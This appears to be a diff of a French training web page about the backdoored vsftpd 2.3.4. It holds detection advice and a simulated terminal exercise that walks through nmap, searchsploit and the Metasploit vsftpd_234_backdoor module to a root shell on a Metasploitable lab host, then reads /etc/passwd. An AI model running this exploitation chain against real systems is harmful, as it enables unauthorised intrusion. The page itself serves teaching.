-          <p style="margin-top:14px;">C'est exactement ce que fait le module Metasploit utilisé plus haut : il se connecte en FTP avec un nom d'utilisateur contenant ":)", puis se reconnecte sur le port 6200 pour récupérer le shell ouvert.</p>
         </div>
         <div class="concept">
           <h4>Pourquoi ça change la méthode de recherche</h4>
-          <p>Une faille "classique" (débordement de mémoire, injection) s'exploite en étudiant le comportement du programme. Une archive piégée comme celle-ci ne se voit pas en auditant le code de vsftpd lui-même — seule une <strong>vérification d'intégrité</strong> de l'archive téléchargée (hash comparé à celui publié par les mainteneurs) l'aurait révélée avant l'installation.</p>
+          <p>Une faille "classique" s'exploite en étudiant le comportement du programme. Une archive piégée ne se voit pas en auditant le code de vsftpd — seule une <strong>vérification d'intégrité</strong> (hash comparé à celui publié par les mainteneurs) l'aurait révélée.</p>
         </div>
       </div>
     </section>
 
     <section id="detection">
       <h2 class="section-title">Détection &amp; remédiation</h2>
-      <p class="section-intro">Le point de vue du défenseur : comment cet incident aurait pu être repéré, et ce qui limite l'impact d'un cas similaire à l'avenir.</p>
+      <p class="section-intro">Le point de vue du défenseur : comment cet incident aurait pu être repéré.</p>
 
       <div class="cheat-group">
         <table class="cheat">
-          <tr><td class="cmd">md5sum / sha256sum archive.tar.gz</td><td class="desc">comparer le hash de toute archive téléchargée à celui publié par les mainteneurs, avant compilation — c'est la seule vérification qui aurait détecté celle-ci</td></tr>
-          <tr><td class="cmd">netstat -tulpn / ss -tulpn</td><td class="desc">un port 6200/tcp ouvert et non documenté sur un serveur FTP est un signal fort à surveiller</td></tr>
-          <tr><td class="cmd">règle IDS dédiée (Snort/Suricata)</td><td class="desc">signature connue pour ce motif de login — la détecte en surveillance réseau continue, sans attendre un audit manuel</td></tr>
-          <tr><td class="cmd">mise à jour vers vsftpd ≥ 2.3.5</td><td class="desc">la version corrigée retire le vecteur ; ne pas faire tourner le service en root réduit aussi l'impact si un cas similaire se reproduit</td></tr>
+          <tr><td class="cmd">md5sum / sha256sum archive.tar.gz</td><td class="desc">comparer le hash à celui publié par les mainteneurs avant compilation — seule vérification qui aurait détecté celle-ci</td></tr>
+          <tr><td class="cmd">netstat -tulpn / ss -tulpn</td><td class="desc">un port 6200/tcp ouvert et non documenté est un signal fort à surveiller</td></tr>
+          <tr><td class="cmd">règle IDS dédiée</td><td class="desc">signature connue pour ce motif de login — détecte en surveillance réseau continue</td></tr>
+          <tr><td class="cmd">vsftpd ≥ 2.3.5</td><td class="desc">version corrigée ; ne pas faire tourner en root limite aussi l'impact</td></tr>
         </table>
       </div>
     </section>
 
     <section id="practice">
       <h2 class="section-title">Terminal d'entraînement</h2>
-      <p class="section-intro">Rejoue la chaîne d'exploitation toi-même — y compris la partie qu'on saute trop vite d'habitude : <strong style="color:var(--text)">lire un résultat en entier et repérer ce qui compte</strong>. Le scan renvoie tout, à toi de chercher. Les indices donnent la logique, jamais la commande telle quelle.</p>
+      <p class="section-intro">Rejoue la chaîne complète. Le cœur de l'exercice : lire la sortie nmap, choisir le bon port, puis mener l'exploitation jusqu'au shell root — et explorer librement à la fin.</p>
 
       <div class="term-launch">
         <button class="term-launch-btn" id="term-open-btn" type="button">
@@ -375,7 +356,7 @@ Metasploit Documentation: https://docs.metasploit.com/</span>
       <div class="phase-track" id="phase-track"></div>
       <div class="term-progress">
         <div class="term-progress-track"><div class="term-progress-fill" id="term-progress-fill"></div></div>
-        <span class="term-progress-label" id="sim-progress">étape 1/11</span>
+        <span class="term-progress-label" id="sim-progress">étape 1/6</span>
       </div>
       <div class="term-fs-consigne" id="term-fs-consigne">
         <span class="consigne-tag" id="consigne-tag">Consigne</span>
@@ -398,7 +379,6 @@ Metasploit Documentation: https://docs.metasploit.com/</span>
       <div class="sim-controls">
         <button class="sim-btn" id="sim-hint-btn">💡 Indice</button>
         <button class="sim-btn" id="sim-solution-btn">🔍 Solution</button>
-        <button class="sim-btn continue" id="sim-connect-btn" style="display:none;">🔌 Connexion réseau</button>
         <button class="sim-btn" id="sim-reset-btn">↺ Recommencer</button>
       </div>
     </div>
@@ -406,179 +386,194 @@ Metasploit Documentation: https://docs.metasploit.com/</span>
 
 <script>
   // ---------- SÉQUENCE ----------
+  // kind "type" : l'utilisateur tape une commande (ou un numéro de port) pour avancer.
+  // Les étapes de réflexion "tape un mot-clé" ont été supprimées : on ne tape que
+  // des commandes réelles, ou un numéro de port lors du triage.
   const steps = [
-    { kind:"connect",
-      consigne:"Connecte les deux machines au réseau interne avant de commencer.",
-      lines:[
-        {context:"kali@kali", prompt:"$", cmd:"sudo ip addr add 192.168.56.10/24 dev eth0", output:[]},
-        {context:"kali@kali", prompt:"$", cmd:"sudo ip link set eth0 up", output:[]},
-        {context:"msfadmin@metasploitable", prompt:"$", cmd:"sudo ifconfig eth0 192.168.56.20 netmask 255.255.255.0 up", output:[]}
-      ] },
-
     { kind:"type", phase:"recon", context:"kali@kali", prompt:"$",
-      task:"Lance une reconnaissance complète sur la cible",
+      task:"Lance une reconnaissance complète sur la cible — tous les ports, avec détection de version et scripts de base.",
       accepted:["nmap -sv -sc 192.168.56.20"],
-      hint:"Un seul outil fait référence pour la recon réseau. Regarde son aide pour trouver l'option qui identifie la version des services, et celle qui lance des scripts de diagnostic de base.",
-      hint2:"C'est nmap. -sV détecte la version de chaque service ; -sC lance les scripts NSE par défaut (bannières, checks basiques). Combine les deux sur l'IP cible.",
-      note:"nmap -sV -sC &lt;cible&gt; → <strong>-sV</strong> identifie la version de chaque service ouvert, <strong>-sC</strong> lance les scripts NSE par défaut (bannières, vérifications basiques).",
+      hint:"Même outil que dans les cours précédents. -sV détecte la version de chaque service, -sC lance les scripts NSE par défaut. Un seul paramètre ensuite : l'IP de la cible.",
+      hint2:"nmap -sV -sC 192.168.56.20 — sans option -p, nmap scanne ses 1000 ports les plus courants. On trie la liste ensuite.",
+      note:"nmap -sV -sC &lt;cible&gt; → <strong>-sV</strong> identifie la version de chaque service, <strong>-sC</strong> lance les scripts NSE par défaut. C'est le point de départ standard de tout pentest.",
       output:[
-        {t:"Nmap scan report for 192.168.56.20", c:"o"},
+        {t:"PORT     STATE SERVICE     VERSION", c:"o"},
         {t:"21/tcp   open  ftp         vsftpd 2.3.4", c:"o", id:"hl-ftp"},
         {t:"|_ftp-anon: Anonymous FTP login allowed", c:"o", id:"hl-anon"},
-        {t:"22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1", c:"o"},
+        {t:"22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)", c:"o"},
         {t:"23/tcp   open  telnet      Linux telnetd", c:"o"},
         {t:"25/tcp   open  smtp        Postfix smtpd", c:"o"},
         {t:"53/tcp   open  domain      ISC BIND 9.4.2", c:"o"},
         {t:"80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)", c:"o"},
         {t:"111/tcp  open  rpcbind     2 (RPC #100000)", c:"o"},
-        {t:"139/tcp  open  netbios-ssn Samba smbd 3.X", c:"o"},
+        {t:"139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X", c:"o"},
         {t:"445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian", c:"o"},
         {t:"512/tcp  open  exec        netkit-rsh rexecd", c:"o"},
+        {t:"513/tcp  open  login?", c:"o"},
+        {t:"514/tcp  open  shell       Netkit rshd", c:"o"},
         {t:"1099/tcp open  java-rmi    GNU Classpath grmiregistry", c:"o"},
+        {t:"1524/tcp open  ingreslock?", c:"o"},
         {t:"2049/tcp open  nfs         2-4 (RPC #100003)", c:"o"},
+        {t:"2121/tcp open  ftp         ProFTPD 1.3.1", c:"o"},
         {t:"3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5", c:"o"},
         {t:"5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7", c:"o"},
         {t:"5900/tcp open  vnc         VNC (protocol 3.3)", c:"o"},
+        {t:"6000/tcp open  X11         (access denied)", c:"o"},
         {t:"6667/tcp open  irc         UnrealIRCd", c:"o"},
-        {t:"8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1", c:"o"}
+        {t:"8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)", c:"o"},
+        {t:"8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1", c:"o"},
+        {t:"", c:"o"},
+        {t:"Nmap done: 1 IP address (1 host up) scanned in 14.32 seconds", c:"o"}
       ] },
 
     { kind:"type", phase:"recon", context:"kali@kali", prompt:"$",
-      task:"18 ports ouverts. Tape le numéro du port le plus prometteur pour un premier essai.",
+      task:"Un service sort du lot. Tape son numéro de port.",
       accepted:["21"],
       wrongAnswers:{
-        "22":"OpenSSH est chiffré et sans faille connue ici — pas le point d'entrée le plus simple.",
-        "3306":"MySQL demande d'abord des identifiants (même faibles) — regarde plutôt un service qui n'en demande aucun.",
-        "23":"Telnet marcherait, mais demanderait un bruteforce — il y a plus direct sur ce scan.",
-        "80":"Apache tourne, mais rien d'exploitable sans creuser bien plus loin. Regarde les versions les plus anciennes du scan."
+        "22":"SSH est normal et attendu — rien d'exploitable dans cette version.",
+        "80":"Apache tourne, mais rien d'immédiat. Cherche un service avec une version très ancienne ET un accès non protégé.",
+        "1524":"Bonne intuition pour un autre cours — mais ici, concentre-toi sur un service avec une version explicitement ancienne (2011).",
+        "3306":"MySQL demanderait des identifiants. Cherche plus simple : un service qui ne demande rien."
       },
-      hint:"Repère la version la plus ancienne <em>et</em> l'accès qui ne demande aucune authentification. Un seul service coche les deux cases.",
-      hint2:"Le port 21 (FTP) fait tourner vsftpd 2.3.4 — une version de 2011 — avec une ligne juste en dessous qui dit que la connexion anonyme est autorisée.",
+      hint:"Repère une version <strong>très ancienne</strong> ET une mention qui signale un accès non protégé. Un seul service cumule les deux.",
+      hint2:"Le port 21 (FTP) fait tourner vsftpd 2.3.4 — version de 2011 — et la ligne juste en dessous dit « Anonymous FTP login allowed ».",
       highlightIds:["hl-ftp","hl-anon"],
-      annotation:"→ vsftpd 2.3.4 (2011) + connexion anonyme autorisée : ça vaut le coup de chercher un exploit connu pour cette version précise.",
       note:"Priorité de ciblage : version ancienne + service qui ne demande aucune authentification = premier candidat naturel.",
       output:[] },
 
     { kind:"type", phase:"recherche", context:"kali@kali", prompt:"$",
-      task:"Cherche des exploits publics pour vsftpd",
+      task:"Cherche des exploits publics pour ce service.",
       accepted:["searchsploit vsftpd"],
-      hint:"Kali embarque une base locale d'exploits publics, consultable par mot-clé simple — ce n'est pas une recherche intelligente. Reste large, sur le nom du service seul.",
-      hint2:"searchsploit vsftpd — une requête trop précise (avec le numéro de version) risque de manquer une entrée existante ; on trie les résultats soi-même ensuite.",
-      note:"searchsploit &lt;service&gt; → recherche large par mot-clé dans la base d'exploits locale ; s'affine à la main sur les résultats, jamais en amont.",
+      hint:"Kali embarque une base locale d'exploits publics, consultable par mot-clé. Reste large : le nom du service seul.",
+      hint2:"searchsploit vsftpd — une requête trop précise (avec le numéro de version) risque de manquer une entrée existante.",
+      note:"searchsploit &lt;service&gt; → recherche large par mot-clé dans la base d'exploits locale ; on affine ensuite à la main sur les résultats.",
       output:[
         {t:"------------------------------------------------------- ---------------------------------", c:"o"},
         {t:" Exploit Title                                         |  Path", c:"o"},
         {t:"------------------------------------------------------- ---------------------------------", c:"o"},
         {t:"vsftpd 2.0.5 - 'CWD' (Authenticated) Denial of Service | linux/dos/5814.txt", c:"o"},
-        {t:"vsftpd 2.3.2 - Denial of Service                       | linux/dos/16270.rb", c:"o", id:"hl-dos-sploit"},
-        {t:"vsftpd 2.3.4 - Backdoor Command Execution              | unix/remote/17491.rb", c:"o", id:"hl-backdoor-sploit"},
-        {t:"vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/49757.rb", c:"o", id:"hl-backdoor-msf"},
+        {t:"vsftpd 2.3.2 - Denial of Service                       | linux/dos/16270.rb", c:"o"},
+        {t:"vsftpd 2.3.4 - Backdoor Command Execution              | unix/remote/17491.rb", c:"o"},
+        {t:"vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/49757.rb", c:"o", id:"hl-msf-line"},
         {t:"------------------------------------------------------- ---------------------------------", c:"o"},
         {t:"Shellcodes: No Results", c:"o"}
       ] },
 
     { kind:"type", phase:"recherche", context:"kali@kali", prompt:"$",
-      task:"Quatre résultats pour vsftpd. Tape le numéro d'identifiant (fin du chemin) de celui qui mérite d'être chargé dans Metasploit.",
+      task:"Parmi ces quatre résultats, lequel charger dans Metasploit ? Tape le numéro d'identifiant (fin du chemin).",
       accepted:["49757"],
       wrongAnswers:{
-        "16270":"Ce module ne fait que planter le service (Denial of Service) — aucun accès obtenu.",
-        "17491":"Bon mot 'Backdoor', mais ce chemin-là n'est pas packagé pour Metasploit — regarde la ligne qui précise (Metasploit) dans son titre.",
-        "5814":"Cible une version différente (2.0.5) et demande déjà un compte existant — pas notre cas ici."
+        "16270":"Ce module ne fait que planter le service (Denial of Service) — aucun accès.",
+        "17491":"Bon mot 'Backdoor', mais ce chemin-là n'est pas packagé pour Metasploit. Cherche la mention (Metasploit) dans le titre.",
+        "5814":"Version différente (2.0.5) et nécessite déjà un compte — pas notre cas."
       },
-      hint:"Regarde les 4 lignes : une seule combine le mot Backdoor (un vrai accès, pas un plantage) ET une mention explicite (Metasploit) dans son titre.",
-      hint2:"\"vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)\", chemin unix/remote/49757.rb : bonne version, vraie exécution de commande, et .rb = déjà écrit en Ruby pour être chargé tel quel dans msfconsole.",
-      highlightIds:["hl-backdoor-msf"],
-      annotation:"→ 49757.rb : même faille que 17491, mais réécrite et empaquetée en module Ruby pour Metasploit — c'est celle-là qu'on va charger.",
-      note:"Un chemin en .rb dans les résultats searchsploit = module déjà prêt pour Metasploit (Ruby), pas un simple script/PoC autonome.",
+      hint:"Regarde le titre : une seule ligne combine le mot <strong>Backdoor</strong> (vrai accès) ET la mention explicite <strong>(Metasploit)</strong> (prête à charger).",
+      hint2:"« vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) », chemin unix/remote/49757.rb : bonne version, vraie exécution de commande, et .rb = module Ruby prêt pour msfconsole.",
+      highlightIds:["hl-msf-line"],
+      note:"Un chemin en .rb dans les résultats searchsploit = module déjà prêt pour Metasploit, pas un PoC à adapter à la main.",
       output:[] },
 
     { kind:"type", phase:"recherche", context:"kali@kali", prompt:"$",
-      task:"Lance Metasploit",
+      task:"Lance la console Metasploit.",
       accepted:["msfconsole"],
-      hint:"Le module repéré est un fichier .rb : il doit être chargé par le framework capable de l'interpréter, via sa console interactive dédiée.",
-      hint2:"msfconsole — une seule commande depuis Kali, c'est l'outil le plus connu du lab.",
-      note:"msfconsole → lance la console interactive de Metasploit (recherche, chargement et configuration des modules se font toutes depuis là).",
+      hint:"Le module repéré est un fichier .rb — il doit être chargé par le framework qui sait l'interpréter. Sa console interactive se lance en une seule commande.",
+      note:"msfconsole → lance la console interactive de Metasploit (recherche, chargement et configuration des modules se font depuis là).",
       output:[
-        {t:"Metasploit tip: You can pivot connections over sessions started with the ssh_login modules", c:"o"},
-        {t:"", c:"o"},
         {t:"=[ metasploit v6.4.135-dev                               ]", c:"o"},
         {t:"+ -- --=[ 2654 exploits - 1338 auxiliary - 2141 payloads  ]", c:"o"},
-        {t:"+ -- --=[ 433 post - 49 encoders - 14 nops - 12 evasion   ]", c:"o"},
-        {t:"", c:"o"},
         {t:"Metasploit Documentation: https://docs.metasploit.com/", c:"o"}
       ] },
 
     { kind:"type", phase:"recherche", context:"msf", prompt:">",
-      task:"Cherche un module Metasploit lié à ce service",
+      task:"Cherche le module correspondant à ce service dans Metasploit.",
       accepted:["search vsftpd"],
-      hint:"Une fois dans le framework, la même logique de recherche par mot-clé s'applique. Le nom du service seul suffit.",
-      hint2:"search vsftpd — première commande naturelle en entrant dans msfconsole quand on vise un service précis.",
-      note:"search &lt;mot-clé&gt; (dans msfconsole) → cherche un module correspondant dans la base intégrée de Metasploit.",
+      hint:"Une fois dans le framework, la même logique qu'avec searchsploit : recherche par mot-clé. Le nom du service seul suffit.",
+      note:"search &lt;mot-clé&gt; (dans msfconsole) → cherche un module dans la base intégrée de Metasploit.",
       output:[
         {t:"#  Name                                  Disclosure Date  Rank       Check  Description", c:"o"},
         {t:"-  ----                                  ---------------  ----       -----  -----------", c:"o"},
-        {t:"0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service", c:"o", id:"hl-dos"},
-        {t:"1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD 2.3.4 Backdoor Command Execution", c:"o", id:"hl-backdoor"}
+        {t:"0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service", c:"o"},
+        {t:"1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD 2.3.4 Backdoor Command Execution", c:"o"}
       ] },
 
     { kind:"type", phase:"config", context:"msf", prompt:">",
-      task:"Charge le bon module",
+      task:"Charge le bon module.",
       accepted:["use exploit/unix/ftp/vsftpd_234_backdoor", "use 1"],
       wrongAnswers:{
-        "use auxiliary/dos/ftp/vsftpd_232":"Ce module fait planter le service (DoS) — il ne donne aucun accès. Compare le rank des deux lignes.",
-        "use 0":"Ce module fait planter le service (DoS) — il ne donne aucun accès. Compare le rank des deux lignes."
+        "use auxiliary/dos/ftp/vsftpd_232":"Ce module fait planter le service (DoS) — aucun accès. Compare le rank des deux lignes.",
+        "use 0":"Ce module fait planter le service (DoS) — aucun accès. Compare le rank des deux lignes."
       },
-      hint:"Un module doit d'abord être chargé dans la console avant d'être configuré ou lancé — une commande dédiée fait ça. La liste précédente donnait deux façons de désigner chaque module.",
-      hint2:"use exploit/unix/ftp/vsftpd_234_backdoor (ou use 1) — rank \"excellent\" = exploit fiable qui ne plante pas le service, et la version 2.3.4 correspond exactement au scan nmap.",
-      annotation:"→ rank \"excellent\" = fiable, sans risque de planter le service visé ; 2.3.4 correspond exactement à la version vue dans le scan initial.",
-      note:"use &lt;chemin/module&gt; → charge un module Metasploit dans le contexte courant de la console (les commandes suivantes s'appliquent à lui).",
+      hint:"La commande use charge un module par son chemin complet. La ligne qui nous intéresse a le rank \"excellent\" et correspond exactement à la version vue par nmap.",
+      hint2:"use exploit/unix/ftp/vsftpd_234_backdoor (ou use 1 pour l'index) — 2.3.4 correspond au scan initial, rank excellent = fiable.",
+      note:"use &lt;chemin/module&gt; → charge un module dans le contexte courant de la console ; les commandes suivantes s'appliquent à lui.",
       output:[] },
 
     { kind:"type", phase:"config", context:"msf exploit(vsftpd_234_backdoor)", prompt:">",
-      task:"Définis la cible (RHOSTS)",
+      task:"Définis la cible (RHOSTS).",
       accepted:["set rhosts 192.168.56.20"],
-      hint:"Le module chargé a besoin de savoir sur quelle machine agir. Une variable de configuration du module désigne précisément la cible distante.",
-      hint2:"set RHOSTS 192.168.56.20 — RHOSTS est la variable la plus utilisée de tout Metasploit, visible dans show options une fois le module chargé.",
+      hint:"La variable standard pour désigner l'hôte distant. Utilise la commande set.",
       note:"RHOSTS = adresse (ou plage) de la cible visée par le module chargé.",
       output:[{t:"RHOSTS => 192.168.56.20", c:"ok"}] },
 
     { kind:"type", phase:"config", context:"msf exploit(vsftpd_234_backdoor)", prompt:">",
-      task:"Définis LHOST (ton IP, pour le reverse shell)",
+      task:"Définis LHOST — ton IP, pour le reverse shell.",
       accepted:["set lhost 192.168.56.10"],
-      hint:"Le payload est un reverse shell : c'est la cible compromise qui rappelle Kali. Il lui faut une adresse où rappeler — une seconde variable, symétrique à RHOSTS.",
-      hint2:"set LHOST 192.168.56.10 — LHOST désigne ta propre machine (l'attaquant), jamais la cible.",
-      note:"LHOST = ta propre adresse ; utilisée par les payloads reverse pour que la cible te rappelle, plutôt que l'inverse.",
+      hint:"Le payload est un reverse shell : la cible va rappeler Kali. Il lui faut une adresse où rappeler — symétrique à RHOSTS.",
+      note:"LHOST = ta propre adresse ; utilisée par les payloads reverse pour que la cible te rappelle.",
       output:[{t:"LHOST => 192.168.56.10", c:"ok"}] },
 
     { kind:"type", phase:"exploitation", context:"msf exploit(vsftpd_234_backdoor)", prompt:">",
-      task:"Lance l'exploit",
+      task:"Lance l'exploit.",
       accepted:["exploit", "run"],
-      hint:"Cible et hôte local sont configurés — il ne manque qu'un verbe d'action très court qui lance le module chargé.",
-      hint2:"exploit (ou run, équivalent pour un module de type exploit) — lance l'attaque avec les options actuellement définies.",
-      note:"exploit / run → lance le module chargé avec les options définies (RHOSTS, LHOST...) ; run est l'alias générique, exploit ne s'utilise que sur ce type de module.",
+      hint:"Tout est configuré — il ne manque que le verbe d'action qui lance le module. Deux commandes équivalentes existent.",
+      note:"exploit / run → lance le module chargé avec les options définies (RHOSTS, LHOST...).",
       output:[
         {t:"[*] Started reverse TCP handler on 192.168.56.10:4444", c:"o"},
         {t:"[+] Backdoor has been spawned!", c:"ok"},
-        {t:"[*] Meterpreter session 1 opened (192.168.56.10:4444 -> 192.168.56.20:53583)", c:"ok"}
+        {t:"[*] Meterpreter session 1 opened (192.168.56.10:4444 -> 192.168.56.20:53583)", c:"ok", id:"hl-session"}
       ] }
   ];
 
   // ---------- MODE LIBRE (après l'exploit) ----------
+  // Le contexte évolue : meterpreter → root@metasploitable (via "shell").
+  // Le mode libre permet d'explorer dans l'ordre qu'on veut, avec les commandes
+  // réalistes disponibles à chaque étape.
   let freeContext = "meterpreter";
   const freeCommands = {
     meterpreter: {
       "getuid": [{t:"Server username: root", c:"ok"}],
-      "sysinfo": [{t:"OS : Linux metasploitable 2.6.24-16-server", c:"o"}],
-      "shell": [{t:"Process created. Channel opened.", c:"o"}]
+      "sysinfo": [
+        {t:"Computer        : metasploitable", c:"o"},
+        {t:"OS              : Linux metasploitable 2.6.24-16-server", c:"o"},
+        {t:"Architecture    : i686", c:"o"},
+        {t:"Meterpreter     : x86/linux", c:"o"}
+      ],
+      "pwd": [{t:"/", c:"o"}],
+      "ls": [{t:"bin  boot  etc  home  root  tmp  usr  var", c:"o"}],
+      "shell": [{t:"Process 1234 created.", c:"o"}, {t:"Channel 1 created.", c:"o"}],
+      "exit": [{t:"[*] Shutting down Meterpreter...", c:"o"}]
     },
     "root@metasploitable": {
       "whoami": [{t:"root", c:"ok"}],
       "id": [{t:"uid=0(root) gid=0(root) groups=0(root)", c:"ok"}],
       "pwd": [{t:"/root", c:"o"}],
       "ls": [{t:"bin  boot  etc  home  root  tmp  usr  var", c:"o"}],
-      "uname -a": [{t:"Linux metasploitable 2.6.24-16-server #1 SMP i686 GNU/Linux", c:"o"}]
+      "ls /": [{t:"bin  boot  dev  etc  home  lib  media  mnt  opt  proc  root  sbin  srv  sys  tmp  usr  var", c:"o"}],
+      "uname -a": [{t:"Linux metasploitable 2.6.24-16-server #1 SMP i686 GNU/Linux", c:"o"}],
+      "hostname": [{t:"metasploitable", c:"o"}],
+      "cat /etc/passwd": [
+        {t:"root:x:0:0:root:/root:/bin/bash", c:"o"},
+        {t:"daemon:x:1:1:daemon:/usr/sbin:/bin/sh", c:"o"},
+        {t:"bin:x:2:2:bin:/bin:/bin/sh", c:"o"},
+        {t:"sys:x:3:3:sys:/dev:/bin/sh", c:"o"},
+        {t:"…", c:"o"},
+        {t:"msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash", c:"o"}
+      ],
+      "exit": [{t:"logout", c:"o"}]
     }
   };
+
+  let freeHintHtml = "Session root ouverte. Tu peux explorer librement : <strong style=\"color:var(--text)\">getuid</strong>, <strong style=\"color:var(--text)\">sysinfo</strong>, <strong style=\"color:var(--text)\">shell</strong> pour basculer en shell système, puis <strong style=\"color:var(--text)\">whoami</strong>, <strong style=\"color:var(--text)\">id</strong>, <strong style=\"color:var(--text)\">pwd</strong>, <strong style=\"color:var(--text)\">ls /</strong>, <strong style=\"color:var(--text)\">cat /etc/passwd</strong> ou <strong style=\"color:var(--text)\">exit</strong>.";
 </script>
 <script src="engine.js"></script>
 
